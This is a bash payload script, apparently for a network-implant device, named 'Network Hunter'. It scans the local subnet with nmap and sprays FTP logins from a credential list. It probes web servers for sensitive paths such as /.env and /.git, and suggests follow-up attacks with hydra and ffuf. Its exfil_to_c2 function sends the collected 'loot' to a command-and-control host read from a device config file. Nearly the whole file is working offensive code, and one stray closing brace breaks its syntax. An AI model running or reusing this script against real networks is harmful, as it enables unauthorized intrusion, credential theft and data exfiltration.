log_both() {
  LOG "$1"
  echo "$1" >> "$OUTFILE"
}

log_error() {
  local error_msg="$1"
  echo "[ERROR] $(date +%H:%M:%S) - $error_msg" >> "$OUTFILE"
  echo "[ERROR] $(date +%H:%M:%S) - $error_msg" >> "$LOOT_BASE/errors.log"
}

}

set_netmode_dhcp() {
  NETMODE DHCP_CLIENT
  WAIT_FOR_IP
  IPADDR=$(ip -o -4 addr show eth0 | awk '{print $4}' | cut -d/ -f1)
}

log_network_info() {
  GW=$(ip route | awk '/default/ {print $3}')
  DNS=$(cat /etc/resolv.conf | awk '/nameserver/ {print $2}' | head -1)
  log_both "My IP:   $IPADDR"
  log_both "Gateway: $GW"
  log_both "DNS:     $DNS"
  log_both "Network: $CIDR"
  log_both "================================"
}

ping_sweep() {
  CREATE_SPINNER "Ping Sweep..."
  LIVE_HOSTS=$(nmap -sn "$CIDR" 2>/dev/null | grep "Nmap scan report" | wc -l)
  STOP_SPINNER
  ALERT "$LIVE_HOSTS live host(s)" 2 false
  log_both "Live hosts discovered: $LIVE_HOSTS"
}

enumerate_network() {
  CREATE_SPINNER "Scanning..."
  
  PORTS="21,22,53,88,135,139,389,443,445,1337,3268,3269,3389,5985,5986,8000,8080,8081,8082,8090,8443,8888,9000,5000,3000,9100"
  nmap -sS -p $PORTS -sV "$CIDR" > "$SCAN_FILE" 2>&1
  
  STOP_SPINNER

  log_both ""
  log_both "================================"
  log_both "ENUMERATED HOSTS & SERVICES"
  log_both "================================"
  log_both ""

  grep "Nmap scan report for" "$SCAN_FILE" | while read line; do
    IP=$(echo "$line" | awk '{print $NF}')
    PORTS_LINE=$(grep -A 50 "Nmap scan report for $IP" "$SCAN_FILE" | grep "open" | head -20)
    
    if [ -n "$PORTS_LINE" ]; then
      SERVICES=$(echo "$PORTS_LINE" | awk '{print $1 "(" $3 ")"}' | tr '\n' ',' | sed 's/,$//g')
      log_both "$IP | $SERVICES"
    fi
  done
}

get_targets_by_port() {
  local port=$1
  grep "Nmap scan report for" "$SCAN_FILE" | while read line; do
    IP=$(echo "$line" | awk '{print $NF}')
    if grep -A 50 "Nmap scan report for $IP" "$SCAN_FILE" | grep "^${port}/tcp.*open" > /dev/null; then
      echo "$IP"
    fi
  done
}

scan_network() {
  TS=$(date +%F_%H-%M-%S)
  OUTFILE="$LOOT_BASE/network_hunter_$TS.txt"
  touch "$OUTFILE"

  ALERT "Waiting for link..." 1 false
  WAIT_FOR_LINK
  set_netmode_dhcp

  CIDR=$(ip -4 route show dev eth0 | awk '/scope link/ {print $1}')
  if [ -z "$CIDR" ]; then
    ALERT "No CIDR" 3 false
    return
  fi

  log_both "=== Network Hunter v1.0 ==="
  log_both "Timestamp: $TS"
  log_network_info

  ALERT "Scanning..." 1 false
  ping_sweep
  enumerate_network
  
  log_both ""
  log_both "Scan complete and saved to loot"
  ALERT "Scan complete!" 2 false
  exfil_to_c2
}

test_ftp_port() {
  local ip=$1
  local user=$2
  local pass=$3
  
  curl -s --connect-timeout 2 -u "$user:$pass" "ftp://$ip/" 2>&1 > /dev/null
  return $?
}

spray_ftp_all() {
  FTP_TARGETS=$(get_targets_by_port "21")
  
  if [ -z "$FTP_TARGETS" ]; then
    log_both ""
    log_both "FTP Targets: None found"
    log_both ""
    return
  fi
  
  log_both ""
  log_both "FTP Targets:"
  log_both ""
  
  for ip in $FTP_TARGETS; do
    # First check if FTP is actually responding
    if ! timeout 2 bash -c "echo > /dev/tcp/$ip/21" 2>/dev/null; then
      log_both "  ✗ $ip - FTP: Port 21 open but service not responding"
      continue
    fi
    
    found=0
    
    for cred in "${FTP_CREDS[@]}"; do
      user=$(echo "$cred" | cut -d: -f1)
      pass=$(echo "$cred" | cut -d: -f2)
      
      test_ftp_port "$ip" "$user" "$pass"
      exitcode=$?
      
      # Exit code 19 = login successful (RETR response, file not found but logged in)
      # Exit code 67 = login denied (I find that using exit codes was more reliable)
      if [ $exitcode -eq 19 ]; then
        log_both "  ✓ $ip - FTP: $user:$pass"
        found=1
      fi
    done
    
    if [ $found -eq 0 ]; then
      log_both "  ✗ $ip - FTP: No credentials found"
    else
      log_both ""
      log_both "    Post-Recon Next Steps:"
      log_both "      1. Connect: ftp $ip"
      log_both "      2. List files: ls -la"
      log_both "      3. Download sensitive files: get filename"
      log_both "      4. Check for credentials in config files"
      log_both "      5. Enumerate user directories and permissions"
      log_both ""
    fi
  done
}

spray_http_all() {
  # Scan multiple common HTTP/HTTPS ports
  declare -a HTTP_PORTS=(80 1337 8080 8000 8888 3000 5000 9000 8443 443 8081 8082 8090)
  
  # Common default paths to check
  declare -a DEFAULT_PATHS=("/admin" "/login" "/api" "/admin/login" "/wp-admin" "/administrator" "/phpmyadmin" "/console" "/panel" "/control" "/dashboard" "/.git" "/.env" "/config.php" "/web.config" "/robots.txt" "/backup" "/uploads" "/download" "/test" "/dev" "/debug")
  
  for port in "${HTTP_PORTS[@]}"; do
    HTTP_TARGETS=$(get_targets_by_port "$port")
    
    if [ -z "$HTTP_TARGETS" ]; then
      continue
    fi
    
    log_both ""
    log_both "HTTP Targets (Port $port):"
    log_both ""
    
    for ip in $HTTP_TARGETS; do
      log_both ""
      log_both "[$ip:$port]"
      log_both "  ✓ HTTP detected on port $port"
      log_both ""
      log_both "    Default Paths Found:"
      
      found_paths=0
      for path in "${DEFAULT_PATHS[@]}"; do
        code=$(timeout 2 curl -s -o /dev/null -w "%{http_code}" --max-time 2 "http://$ip:$port$path" 2>/dev/null)
        
        # Log any path that doesn't return 404 or connection error
        if [ -n "$code" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
          log_both "      - $path (HTTP $code)"
          found_paths=$((found_paths + 1))
        fi
      done
      
      if [ $found_paths -eq 0 ]; then
        log_both "      - No common paths found"
      fi
      
      log_both ""
      log_both "    Post-Recon Next Steps:"
      log_both "      1. Enumerate with dirbuster/ffuf: ffuf -w wordlist.txt -u http://$ip:$port/FUZZ"
      log_both "      2. Check robots.txt: curl http://$ip:$port/robots.txt"
      log_both "      3. Identify CMS: whatweb http://$ip:$port"
      log_both "      4. Screenshot: cutycapt --url=http://$ip:$port --out=/tmp/$ip:$port.png"
      log_both "      5. Brute force forms: hydra -l admin -P pass.txt http://$ip:$port/ -V"
      log_both ""
    done
  done
}

exfil_to_c2() {
  if [ ! -f /etc/device.config ]; then
    return
  fi

  ALERT "Sending to C2..." 1 false
  CREATE_SPINNER "Upload..."

  C2_HOST=$(cat /etc/device.config | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | head -1)
  C2_HOST=${C2_HOST:-"localhost"}

  if timeout 10 bash -c "echo >/dev/tcp/$C2_HOST/$C2_PORT" 2>/dev/null; then
    timeout 30 C2CONNECT 2>/dev/null
    CLOUDLOG "Network Hunter" 2>/dev/null || true
    C2EXFIL STRING "$OUTFILE" "network_hunter" 2>/dev/null || true
  fi
  
  STOP_SPINNER
}

view_loot_files() {
  FILES=$(ls "$LOOT_BASE"/*.txt 2>/dev/null | xargs -n1 basename | tr '\n' ' ')
  if [ -z "$FILES" ]; then
    ALERT "No loot files" 2 false
    return
  fi
  RESP="$(LIST_PICKER "Loot Files" "$FILES" "$(echo $FILES | awk '{print $1}')")"
  case "$RESP" in
    "← Back") ;;
    *)
      PREVIEW=$(head -50 "$LOOT_BASE/$RESP" | tr '\n' '|' | sed 's/|/\\n/g')
      ALERT "$PREVIEW" -1 false true
    ;;
  esac
}
